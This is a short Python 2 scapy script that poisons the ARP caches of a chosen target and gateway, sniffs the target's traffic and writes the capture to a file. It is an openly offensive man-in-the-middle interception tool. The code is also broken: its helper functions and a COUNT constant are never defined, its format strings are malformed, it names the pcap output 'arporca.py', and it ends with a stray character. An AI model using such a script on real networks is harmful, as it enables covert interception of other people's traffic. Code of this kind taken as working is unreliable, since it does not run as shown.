__author__ = 'n4rut0'

from scapy.all import *
import sys
import threading

interface = raw_input("[*] Enter interface : ")
target_ip = raw_input("[*] Enter IP target : ")
gateway = raw_input("[*] Enter IP gateway : ")

target_mac = get_mac(target_ip)
if target_mac is None:
    print "!!!! Failed to access mac address"
else:
    print "[*] Mac address of % is %" % (target_ip,target_mac)
    
gateway_mac = get_mac(gateway)
if gateway_mac is None:
    print "!!!! Failed to access mac address"
else:
    print "[*] Mac address of % is % "% (gateway,gateway_mac)
    
poison_thread = threading.Thread(target=poison_target, args = (target_ip,target_mac,gateway,gateway_mac))
poison_thread.start()

try:
    filtering = "ip host %" %(target_ip)
    pkts = sniff(count=COUNT, lfilter=filtering, iface=interface)
    
    wrpcap("arporca.py", pkts)
    
    restore_target(target_ip,target_mac,gateway,gateway_mac)
except KeyboardInterrupt:
    restore_target(target_ip,target_mac,gateway,gateway_mac)
    sys.exit()
    
d
    
    
    
    
    
